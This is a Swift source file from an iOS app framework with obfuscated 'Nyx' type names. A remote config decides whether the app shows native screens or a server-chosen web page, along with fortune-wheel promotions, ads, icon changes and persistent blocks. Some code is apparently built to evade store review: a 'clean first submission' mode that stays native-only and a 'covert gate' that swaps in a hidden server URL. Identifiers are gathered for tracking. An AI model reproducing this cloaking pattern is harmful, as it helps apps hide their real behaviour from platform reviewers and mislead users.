


import Foundation
import Combine
import UIKit
import SwiftUI
import UserNotifications



enum NyxDispatcherState: Equatable {
    case idle
    case loading
    case webContent(URL)
    case nativeContent
    case overlay(NyxNexusType)
    
    
    
    
    
    
    case blocked(NyxForge)
    case error(String)
    case unavailable(reason: String, retryAllowed: Bool, closeAllowed: Bool)

    static func == (lhs: NyxDispatcherState, rhs: NyxDispatcherState) -> Bool {
        switch (lhs, rhs) {
        case (.idle, .idle): return true
        case (.loading, .loading): return true
        case (.webContent(let l), .webContent(let r)): return l == r
        case (.nativeContent, .nativeContent): return true
        case (.overlay(let l), .overlay(let r)): return l == r
        case (.blocked(let l), .blocked(let r)): return l == r
        case (.error, .error): return true
        case (.unavailable(let lr, let lretry, let lclose), .unavailable(let rr, let rretry, let rclose)):
            return lr == rr && lretry == rretry && lclose == rclose
        default: return false
        }
    }
}

enum NyxNexusType: Equatable {
    case pushPermission(settingsMode: Bool = false)
    case rateApp
    case forceUpdate
    
    
    
    
    
    case fortuneWheel(
        targetValue: Int,
        ctaLabel: String?,
        ctaLandingURL: URL?,
        landingMode: String?,
        title: String?,
        subtitle: String?,
        resultTitle: String?,
        segments: [String]?
    )
    
    case nativeAd(
        mediaURL: URL,
        mediaType: String,
        adID: Int?,
        advertiserName: String,
        targetingDisclosure: String,
        autoCloseSec: Int
    )
    case privacyPolicy(url: URL?)
    case iconChange(name: String)
}



@MainActor
protocol NyxPilot: AnyObject {
    
    func routerDidRequestNativeContent()

    
    func routerDidRequestWebContent(url: URL)

    
    func routerDidFinishWebContent()

    
    func routerDidEncounterError(_ error: Error)

    
    func routerWillShowOverlay(_ type: NyxNexusType)

    
    func routerDidDismissOverlay(_ type: NyxNexusType)

    
    func routerDidReceivePushPermission(granted: Bool)

    
    func routerRequiresUpdate(storeURL: URL?)
}


extension NyxPilot {
    func routerDidRequestWebContent(url: URL) { NyxMint.log("Web content: \(url)") }
    func routerDidFinishWebContent() { NyxMint.log("Web content finished") }
    func routerDidEncounterError(_ error: Error) { NyxMint.error("Router error", error) }
    func routerWillShowOverlay(_ type: NyxNexusType) { NyxMint.log("Show overlay: \(type)") }
    func routerDidDismissOverlay(_ type: NyxNexusType) { NyxMint.log("Dismiss overlay: \(type)") }
    func routerDidReceivePushPermission(granted: Bool) { NyxMint.log("Push: \(granted)") }
    func routerRequiresUpdate(storeURL: URL?) { NyxMint.log("Update required") }
}



@MainActor
final class NyxDispatcherRouter: ObservableObject {

    

    static let shared = NyxDispatcherRouter()

    

    @Published private(set) var state: NyxDispatcherState = .idle
    @Published private(set) var isReady: Bool = false
    @Published private(set) var currentConfig: NyxLibraryResponse?
    
    
    
    @Published private(set) var overlay: NyxNexusType?
    
    
    @Published private(set) var topBanner: NyxNexusType?
    
    
    private var pendingOverlay: NyxNexusType?

    
    
    @Published var morphProgress: Float = 0
    @Published var morphStrength: Float = 0

    
    
    
    @Published var webViewBackgroundColor: Color = .black

    
    
    
    @Published private(set) var redirectPolicy: NyxLibraryResponse.NyxMarker?

    

    weak var delegate: NyxPilot?
    private var settings: NyxDispatcherSettings = NyxDispatcherSettings()
    private var pushTimer: Timer?
    private var rateTimer: Timer?
    private var privacyTimer: Timer?
    private var pendingIconName: String?
    private var cancellables = Set<AnyCancellable>()

    private init() {
        setupObservers()
        
        
        
        
        
        
        if let cached = NyxGallery.shared.cachedBlocked, cached.sticky {
            state = .blocked(cached)
            isReady = true
            NyxMint.log("Block restored from sticky cache on cold launch")
        }
    }

    

    func start(settings: sending NyxDispatcherSettings, delegate: NyxPilot? = nil) async {
        self.settings = settings
        self.delegate = delegate

        
        
        
        
        let hasStickyBlocked: Bool = {
            if case .blocked(let p) = state, p.sticky { return true }
            return false
        }()

        guard state == .idle || isErrorState || hasStickyBlocked else {
            NyxMint.warning("Router already started")
            return
        }

        
        
        
        
        if !NyxDispatcherConfig.networkingEnabled {
            state = .nativeContent
            isReady = true
            NyxMint.log("Networking disabled (clean first submission) — native only")
            return
        }

        
        
        
        
        
        
        if NyxDispatcherConfig.covertGateEnabled {
            if let delivered = await NyxCobalt.resolveServerURL() {
                
                self.settings.serverURL = delivered
            } else if hasStickyBlocked {
                
                
                NyxMint.log("Preflight gate closed; sticky block held")
                return
            } else {
                
                
                NyxMint.warning("Preflight unavailable — continuing via app domain")
            }
        }

        if !hasStickyBlocked {
            state = .loading
        }
        NyxMint.log("Router starting...\(hasStickyBlocked ? " (block held from cache)" : "")")

        
        NyxCometHelper.shared.registerASAAttribution()

        
        
        await NyxCompassClient.shared.configure(with: self.settings)

        
        if settings.hasATT && settings.requestTrackingOnLaunch {
            _ = await NyxCometHelper.shared.requestTrackingPermission()
        }

        
        do {
            
            
            
            let webviewUA = NyxDispatcherConfig.cherryFlowEnabled
                ? await NyxFabricProvider.resolve()
                : nil
            let request = NyxLibraryRequest.create(
                uniqueId: NyxGallery.shared.uniqueID,
                hasATT: settings.hasATT,
                appsflyerId: NyxGallery.shared.appsflyerId,
                pushToken: NyxGallery.shared.pushToken,
                webviewUA: webviewUA
            )
            let response = try await NyxCompassClient.shared.fetchConfig(request)

            currentConfig = response
            NyxGallery.shared.cachedConfig = response

            await processConfig(response)

        } catch {
            NyxMint.error("Config fetch failed", error)

            
            
            
            if hasStickyBlocked {
                NyxMint.log("Network failed; sticky block held from cache")
                return
            }

            
            if let cached = NyxGallery.shared.cachedConfig {
                NyxMint.log("Using cached profile")
                currentConfig = cached
                await processConfig(cached)
            } else {
                
                
                state = NyxDispatcherConfig.webSurfaceEnabled
                    ? .unavailable(reason: "network_error", retryAllowed: true, closeAllowed: true)
                    : .nativeContent
                isReady = true
                if !NyxDispatcherConfig.webSurfaceEnabled { delegate?.routerDidRequestNativeContent() }
                delegate?.routerDidEncounterError(error)
                scheduleOverlays()
            }
        }
    }

    
    func start(apiKey: String, delegate: NyxPilot? = nil) async {
        let settings = NyxDispatcherSettings.create()
            .apiKey(apiKey)
            .build()
        await start(settings: settings, delegate: delegate)
    }

    

    private var isErrorState: Bool {
        if case .error = state { return true }
        return false
    }

    private func processConfig(_ config: NyxLibraryResponse) async {
        NyxMint.log("Processing config...")

        
        
        
        
        
        if let blocked = config.blocked {
            if blocked.sticky {
                NyxGallery.shared.cachedBlocked = blocked
            } else {
                NyxGallery.shared.cachedBlocked = nil
            }
            state = .blocked(blocked)
            isReady = true
            NyxMint.log("Block active: \(blocked.title)")
            return
        }
        if NyxGallery.shared.cachedBlocked != nil {
            NyxGallery.shared.cachedBlocked = nil
            NyxMint.log("Block cleared by server")
        }

        
        if config.shouldForceUpdate {
            showOverlay(.forceUpdate)
            isReady = true
            return
        }

        if config.contentRole == "unavailable", let unavailable = config.unavailable {
            redirectPolicy = nil
            state = .unavailable(
                reason: unavailable.reason,
                retryAllowed: unavailable.retryAllowed,
                closeAllowed: unavailable.closeAllowed
            )
            isReady = true
            return
        }

        
        if config.shouldShowWebView, let url = config.webURL {
            redirectPolicy = config.redirectPolicy  
            state = .webContent(url)
            isReady = true
            delegate?.routerDidRequestWebContent(url: url)
            print("PUSH-DEBUG: processConfig → scheduleOverlays (webContent)")
            scheduleOverlays()  
            if config.contentRole == "web_default" {
                if let pool = config.nativeAds, !pool.ads.isEmpty, NyxDispatcherConfig.nativeAdEnabled {
                    scheduleNativeAdPool(pool, isFirst: true)
                } else if let ad = config.nativeAd, NyxDispatcherConfig.nativeAdEnabled {
                    scheduleNativeAd(ad)
                }
            }
        } else {
            redirectPolicy = nil
            startNativeFlow()  
            isReady = true

            
            if let pool = config.nativeAds, !pool.ads.isEmpty, NyxDispatcherConfig.nativeAdEnabled {
                scheduleNativeAdPool(pool, isFirst: true)
            } else if let ad = config.nativeAd, NyxDispatcherConfig.nativeAdEnabled {
                scheduleNativeAd(ad)
            }
        }

        
        if let iconName = config.icon, !iconName.isEmpty {
            scheduleIconChange(iconName)
        }

        
        
        
        if let wheel = config.fortuneWheel, wheel.isEnabled {
            scheduleFortuneWheel(wheel)
        }
    }

    func startNativeFlow() {
        state = .nativeContent
        delegate?.routerDidRequestNativeContent()
        NyxMint.log("Native flow started")
        scheduleOverlays()
    }

    func retry() async {
        state = .idle
        isReady = false
        await start(settings: settings, delegate: delegate)
    }

    func closeUnavailable() {
        state = .nativeContent
        isReady = true
        delegate?.routerDidRequestNativeContent()
    }

    
    
    
    func showWebDefaultUnavailable() {
        state = .unavailable(reason: "network_error", retryAllowed: true, closeAllowed: true)
        isReady = true
    }

    

    func showOverlay(_ type: NyxNexusType) {
        
        
        if overlay != nil {
            pendingOverlay = type
            NyxMint.log("Overlay queued: \(type)")
            return
        }
        overlay = type
        delegate?.routerWillShowOverlay(type)
        NyxMint.log("Showing overlay: \(type)")
    }

    func dismissOverlay() {
        guard let type = overlay else { return }
        overlay = nil
        delegate?.routerDidDismissOverlay(type)

        
        if case .privacyPolicy = type {
            scheduleOverlays()
        }

        
        if let pending = pendingOverlay {
            pendingOverlay = nil
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
                self?.showOverlay(pending)
            }
        }
    }

    func dismissTopBanner() {
        topBanner = nil
    }

    func showPushPermission() {
        print("PUSH-DEBUG: showPushPermission called")
        let storage = NyxGallery.shared

        
        if storage.isPushAccepted {
            print("PUSH-DEBUG: already accepted, skipping")
            return
        }

        
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            Task { @MainActor in
                if settings.authorizationStatus == .authorized {
                    
                    storage.pushResult = "accepted"
                    NyxMint.log("Push already authorized in iOS Settings")
                    return
                }

                let isDeniedBySystem = settings.authorizationStatus == .denied
                storage.pushShownDate = Date()

                if isDeniedBySystem {
                    
                    NyxMint.log("Push denied by system → showing settings prompt")
                    self.showOverlay(.pushPermission(settingsMode: true))
                } else {
                    
                    NyxMint.log("Push not determined → showing first request")
                    self.showOverlay(.pushPermission(settingsMode: false))
                }

                await self.trackEvent(.pushPromptShown, properties: [
                    "mode": isDeniedBySystem ? "settings" : "first"
                ])
            }
        }
    }

    func showRateDialog() {
        guard !NyxGallery.shared.hasRateBeenShown else {
            NyxMint.log("Rate already shown")
            return
        }
        NyxGallery.shared.rateShownDate = Date()
        showOverlay(.rateApp)
        Task { await trackEvent(.rateSheetShown) }
    }

    func showUpdateDialog() {
        showOverlay(.forceUpdate)
        delegate?.routerRequiresUpdate(storeURL: currentConfig?.storeURL)
    }

    

    
    
    func showFortuneWheel(targetValue: Int = Int.random(in: 0...1000)) {
        showOverlay(.fortuneWheel(
            targetValue: targetValue,
            ctaLabel: nil,
            ctaLandingURL: nil,
            landingMode: nil,
            title: nil,
            subtitle: nil,
            resultTitle: nil,
            segments: nil,
        ))
        NyxMint.log("Fortune wheel (manual) with target: \(targetValue)")
    }

    
    
    
    private var fortuneWheelTimer: Timer?

    func scheduleFortuneWheel(_ cfg: NyxLibraryResponse.NyxBeaconConfig) {
        guard cfg.isEnabled, let target = cfg.targetValue else {
            NyxMint.log("Fortune wheel skipped (show=false or no target)")
            return
        }
        let delay = TimeInterval(cfg.delaySec ?? 0)
        let landingURL = cfg.ctaLandingURL.flatMap(URL.init(string:))
        let ctaLabel = cfg.ctaLabel?.isEmpty == false ? cfg.ctaLabel : nil
        let segments = (cfg.segments?.isEmpty == false) ? cfg.segments : nil

        fortuneWheelTimer?.invalidate()
        NyxMint.log("Fortune wheel: landingMode=\(cfg.landingMode ?? "nil") ctaURL=\(landingURL?.absoluteString ?? "nil") ctaLabel=\(ctaLabel ?? "nil") delay=\(delay)s")
        fortuneWheelTimer = Timer.scheduledTimer(
            withTimeInterval: max(0, delay),
            repeats: false,
        ) { [weak self] _ in
            Task { @MainActor in
                self?.showOverlay(.fortuneWheel(
                    targetValue: target,
                    ctaLabel: ctaLabel,
                    ctaLandingURL: landingURL,
                    landingMode: cfg.landingMode,
                    title: cfg.title,
                    subtitle: cfg.subtitle,
                    resultTitle: cfg.resultTitle,
                    segments: segments,
                ))
                await self?.trackEvent(
                    .fortuneWheelShown,
                    properties: ["server_triggered": true],
                )
            }
        }
    }

    

    
    
    
    private var nativeAdTimer: Timer?
    private var lastNativeAdID: Int?

    func scheduleNativeAd(_ cfg: NyxLibraryResponse.NyxPanelConfig) {
        guard cfg.isEnabled, let url = cfg.mediaURLValue else {
            NyxMint.log("Native ad skipped (disabled/no media)")
            return
        }

        let delay = TimeInterval(cfg.delaySec ?? 3)
        let autoClose = cfg.autoCloseSec ?? 15
        let mediaType = (cfg.mediaType?.isEmpty == false) ? cfg.mediaType! : "image"
        let advertiser = cfg.advertiserName ?? "Sponsored partner"
        let disclosure = cfg.targetingDisclosure ?? "Selected contextually for this app. No sensitive personal data was used."

        nativeAdTimer?.invalidate()
        NyxMint.log("Native ad: mediaType=\(mediaType) delay=\(delay)s autoClose=\(autoClose)s")
        nativeAdTimer = Timer.scheduledTimer(
            withTimeInterval: max(0, delay),
            repeats: false,
        ) { [weak self] _ in
            Task { @MainActor in
                self?.showOverlay(.nativeAd(
                    mediaURL: url,
                    mediaType: mediaType,
                    adID: cfg.id,
                    advertiserName: advertiser,
                    targetingDisclosure: disclosure,
                    autoCloseSec: autoClose,
                ))
                await self?.trackEvent(.nativeAdShown, properties: ["media_type": mediaType])
            }
        }
    }

    private func scheduleNativeAdPool(
        _ pool: NyxLibraryResponse.NyxAnchorConfig,
        isFirst: Bool
    ) {
        let eligible = pool.ads.filter { $0.isEnabled && $0.mediaURLValue != nil }
        guard !eligible.isEmpty else {
            NyxMint.log("Native ad pool skipped (empty)")
            return
        }

        let defaultMin = isFirst ? 60 : 180
        let defaultMax = isFirst ? 120 : 360
        let configuredMin = isFirst ? pool.firstDelayMinSec : pool.repeatDelayMinSec
        let configuredMax = isFirst ? pool.firstDelayMaxSec : pool.repeatDelayMaxSec
        let lower = max(isFirst ? 60 : 180, configuredMin ?? defaultMin)
        let upper = max(lower, configuredMax ?? defaultMax)
        let delay = TimeInterval(Int.random(in: lower...upper))

        nativeAdTimer?.invalidate()
        NyxMint.log("Native ad pool: count=\(eligible.count) next=\(Int(delay))s")
        nativeAdTimer = Timer.scheduledTimer(withTimeInterval: delay, repeats: false) {
            [weak self] _ in
            Task { @MainActor in
                guard let self, let ad = self.pickNativeAd(from: eligible),
                      let url = ad.mediaURLValue else { return }
                self.lastNativeAdID = ad.id
                let mediaType = (ad.mediaType?.isEmpty == false) ? ad.mediaType! : "image"
                self.showOverlay(.nativeAd(
                    mediaURL: url,
                    mediaType: mediaType,
                    adID: ad.id,
                    advertiserName: ad.advertiserName ?? "Sponsored partner",
                    targetingDisclosure: ad.targetingDisclosure ?? "Selected contextually for this app. No sensitive personal data was used.",
                    autoCloseSec: ad.autoCloseSec ?? 15
                ))
                await self.trackEvent(.nativeAdShown, properties: [
                    "media_type": mediaType,
                    "ad_id": ad.id as Any,
                ])
                self.scheduleNativeAdPool(pool, isFirst: false)
            }
        }
    }

    private func pickNativeAd(
        from ads: [NyxLibraryResponse.NyxPanelConfig]
    ) -> NyxLibraryResponse.NyxPanelConfig? {
        var candidates = ads
        if candidates.count > 1, let lastNativeAdID {
            candidates.removeAll { $0.id == lastNativeAdID }
        }
        guard !candidates.isEmpty else { return ads.randomElement() }
        let total = candidates.reduce(0) { $0 + max(1, $1.weight ?? 1) }
        var draw = Int.random(in: 1...max(1, total))
        for ad in candidates {
            draw -= max(1, ad.weight ?? 1)
            if draw <= 0 { return ad }
        }
        return candidates.randomElement()
    }

    

    private func scheduleIconChange(_ iconName: String) {
        
        let currentIcon = UIApplication.shared.alternateIconName
        if currentIcon == iconName {
            NyxMint.log("Icon already set to \(iconName), skipping banner")
            return
        }

        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
            self?.showIconChange(iconName)
        }
    }

    func showIconChange(_ iconName: String) {
        pendingIconName = iconName
        showOverlay(.iconChange(name: iconName))
        Task { await trackEvent(.iconBannerShown, properties: ["icon": iconName]) }
        NyxMint.log("Icon change banner: \(iconName)")
    }

    func handleIconSwipeCompleted() {
        guard let iconName = pendingIconName else { return }

        UIApplication.shared.setAlternateIconName(iconName) { [weak self] error in
            Task { @MainActor in
                if let error = error {
                    NyxMint.error("Icon change failed", error)
                } else {
                    NyxMint.log("Icon changed to: \(iconName)")
                    await self?.trackEvent(.iconSwipeCompleted, properties: ["icon": iconName])
                }
                self?.pendingIconName = nil
            }
        }
    }

    func handleIconBannerExpired() {
        if let iconName = pendingIconName {
            Task { await trackEvent(.iconBannerExpired, properties: ["icon": iconName]) }
        }
        pendingIconName = nil
    }

    func showPrivacyPolicy(url: URL? = nil) {
        showOverlay(.privacyPolicy(url: url))
        NyxMint.log("Privacy policy sheet")
    }

    

    func handlePushPermissionResult(granted: Bool) {
        delegate?.routerDidReceivePushPermission(granted: granted)
        dismissOverlay()

        Task {
            if granted {
                await trackEvent(.pushPromptAccepted)
            } else {
                await trackEvent(.pushPromptDeclined)
            }
        }
    }

    

    
    
    
    
    
    
    
    
    
    
    
    
    
    func updatePushToken(_ token: String) {
        let previous = NyxGallery.shared.pushToken
        NyxGallery.shared.pushToken = token

        Task { @MainActor in
            let status = await Self.fetchAuthorizationStatus()
            let authChanged = NyxGallery.shared.pushResult != status
            NyxGallery.shared.pushResult = status

            
            
            
            guard previous != token || authChanged || previous == nil else {
                NyxMint.log("Push token unchanged (\(token.prefix(12))…); skip upload")
                return
            }

            let request = NyxLoftRequest.create(
                token: token,
                authStatus: status,
                environment: Self.currentAPNsEnvironment()
            )

            do {
                let resp = try await NyxCompassClient.shared.uploadPushToken(request)
                NyxMint.log("Push token uploaded — server says push_enabled=\(resp.pushEnabled)")
            } catch {
                NyxMint.error("Failed to upload push token", error)
            }
        }
    }

    
    
    private static func fetchAuthorizationStatus() async -> String {
        let center = UNUserNotificationCenter.current()
        let settings = await center.notificationSettings()
        switch settings.authorizationStatus {
        case .authorized:    return "authorized"
        case .provisional:   return "provisional"
        case .ephemeral:     return "ephemeral"
        case .denied:        return "denied"
        case .notDetermined: return "notDetermined"
        @unknown default:    return "notDetermined"
        }
    }

    
    
    
    
    
    
    private static func currentAPNsEnvironment() -> String {
        #if DEBUG
        return "sandbox"
        #else
        return "production"
        #endif
    }

    
    static func tokenString(from deviceToken: Data) -> String {
        deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
    }

    

    func handleRateResult(rating: Int? = nil, comment: String? = nil) {
        dismissOverlay()

        Task {
            var props: [String: Any] = [:]
            if let rating = rating { props["rating"] = rating }
            if let comment = comment { props["comment"] = comment }

            if props.isEmpty {
                await trackEvent(.rateSheetClosed)
            } else {
                await trackEvent(.rateSliderCompleted, properties: props)
            }
        }
    }

    

    func closeWebContent() {
        state = .nativeContent
        delegate?.routerDidFinishWebContent()
        delegate?.routerDidRequestNativeContent()
    }

    
    
    
    
    
    func openWebContent(url: URL) {
        guard isReady else {
            print("openWebContent IGNORED — isReady=false")
            return
        }
        print("openWebContent: → \(url)")
        state = .webContent(url)
        delegate?.routerDidRequestWebContent(url: url)
    }

    

    func trackEvent(_ event: NyxAtlasRequest.NyxStudio, properties: [String: Any]? = nil) async {
        await NyxCompassClient.shared.trackEvent(
            name: event.rawValue,
            uniqueId: NyxGallery.shared.uniqueID,
            properties: properties
        )
    }

    func trackCustomEvent(name: String, properties: [String: Any]? = nil) async {
        await NyxCompassClient.shared.trackEvent(
            name: name,
            uniqueId: NyxGallery.shared.uniqueID,
            properties: properties
        )
    }

    func reportNativeAd(adID: Int?, reason: String, advertiser: String) {
        Task {
            await trackEvent(.nativeAdReported, properties: [
                "ad_id": adID as Any,
                "reason": reason,
                "advertiser": advertiser,
            ])
        }
    }

    func trackNativeAdTargetingViewed(adID: Int?) {
        Task {
            await trackEvent(.nativeAdTargetingViewed, properties: ["ad_id": adID as Any])
        }
    }

    

    private func scheduleOverlays() {
        print("SCHEDULE-OVERLAYS: config=\(currentConfig != nil) native=\(isNativeFlow) privacy=\(NyxGallery.shared.hasPrivacyBeenAccepted)")
        pushTimer?.invalidate()
        rateTimer?.invalidate()
        privacyTimer?.invalidate()

        
        
        if !NyxGallery.shared.hasPrivacyBeenAccepted && isNativeFlow {
            let privacyDelay = NyxDispatcherConfig.privacyDelay
            NyxMint.log("Scheduling privacy in \(privacyDelay)s (first launch)")
            privacyTimer = Timer.scheduledTimer(withTimeInterval: privacyDelay, repeats: false) { [weak self] _ in
                Task { @MainActor in
                    self?.showPrivacyPolicy(url: self?.settings.privacyURL)
                }
            }
            return
        }

        guard let config = currentConfig else { print("SCHEDULE-OVERLAYS: no config"); return }

        
        
        let pushDelay = settings.pushDelayOverride ?? config.pushDelay
        let shouldShowPush = pushDelay > 0 && !NyxGallery.shared.isPushAccepted
        print("PUSH-DEBUG: delay=\(pushDelay) accepted=\(NyxGallery.shared.isPushAccepted) shouldShow=\(shouldShowPush) result=\(NyxGallery.shared.pushResult ?? "nil")")
        if shouldShowPush {
            print("PUSH-DEBUG: scheduling in \(pushDelay)s")
            pushTimer = Timer.scheduledTimer(withTimeInterval: pushDelay, repeats: false) { [weak self] _ in
                print("PUSH-DEBUG: timer fired")
                Task { @MainActor in self?.showPushPermission() }
            }
        }

        
        let rateDelay = settings.rateDelayOverride ?? config.rateDelay
        if rateDelay > 0 && !NyxGallery.shared.hasRateBeenShown {
            NyxMint.log("Scheduling rate in \(rateDelay)s")
            rateTimer = Timer.scheduledTimer(withTimeInterval: rateDelay, repeats: false) { [weak self] _ in
                Task { @MainActor in self?.showRateDialog() }
            }
        }
    }

    private func setupObservers() {
        NotificationCenter.default.publisher(for: UIApplication.didBecomeActiveNotification)
            .sink { [weak self] _ in
                NyxMint.log("App became active")
                self?.scheduleOverlays()
            }
            .store(in: &cancellables)
    }
}



extension NyxDispatcherRouter {

    var isNativeFlow: Bool {
        state == .nativeContent
    }

    var isWebFlow: Bool {
        if case .webContent = state { return true }
        return false
    }

    var isShowingOverlay: Bool {
        if case .overlay = state { return true }
        return false
    }

    var currentOverlay: NyxNexusType? {
        if case .overlay(let type) = state { return type }
        return nil
    }

    var webURL: URL? {
        if case .webContent(let url) = state { return url }
        return nil
    }

    
    
    
    var isBlockedActive: Bool {
        if case .blocked = state { return true }
        return false
    }

    var currentBlocked: NyxForge? {
        if case .blocked(let payload) = state { return payload }
        return nil
    }
}
